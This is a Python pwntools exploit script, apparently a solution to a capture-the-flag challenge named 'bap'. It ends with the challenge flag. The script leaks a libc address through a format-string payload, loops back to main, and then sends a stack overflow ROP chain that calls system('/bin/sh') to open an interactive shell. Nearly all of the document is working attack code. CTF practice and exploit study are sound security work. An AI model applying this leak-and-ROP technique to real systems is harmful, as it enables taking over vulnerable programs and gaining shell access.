#!/usr/bin/env python3
from pwn import *

context.update(os = "linux", arch = "amd64", log_level = "debug")

exe = ELF("./bap_patched") 
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

p = process(exe.path)
# p = remote("challs.actf.co", 31323)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

def GDB():
    gdb.attach(p, gdbscript = """
        continue
    """)
    pause() 

# GDB()

pay = b"%29$p".ljust(24, b"\x00") 
pay += (p64(exe.symbols["main"] + 5))
sla(b": ", pay)

libc_leak = int(p.recv(14), 16) 
libc.address = libc_leak - libc.symbols["__libc_start_main_impl"] - 128 

poprdi  = 0x000000000002a3e5 + libc.address 
binsh   = next(libc.search(b"/bin/sh"))
system  = libc.symbols["system"]
ret     = 0x4011ce

pay = b"x" * 24 + p64(ret) + p64(poprdi) + p64(binsh) + p64(system)
sla(b": ", pay)

p.interactive()
# actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}
